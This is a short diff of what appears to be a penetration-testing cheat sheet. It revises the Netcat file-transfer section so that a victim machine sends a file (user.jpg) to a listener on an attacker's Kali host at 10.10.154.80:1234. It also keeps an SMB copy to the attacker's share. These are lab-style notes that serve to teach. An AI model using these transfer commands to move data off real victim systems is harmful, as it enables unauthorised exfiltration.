@@ -18,17 +18,15 @@ copy C:\File\to\tranfer.exe \\$KALI\public\
 
 ## Netcat
 
-**Victim**
+**Kali(receiving)**
 
 ```
-nc -nvlp 5050 > stolen.exe
+nc -l -p 1234 > user.jpg
 ```
 
-**Kali**
+**Victim(sending)**
 
 ```
-nc.exe -w3 $VICTIM 5050 < stealme.exe
+nc -w 3 10.10.154.80 1234 < user.jpg
 ```
-
-
 
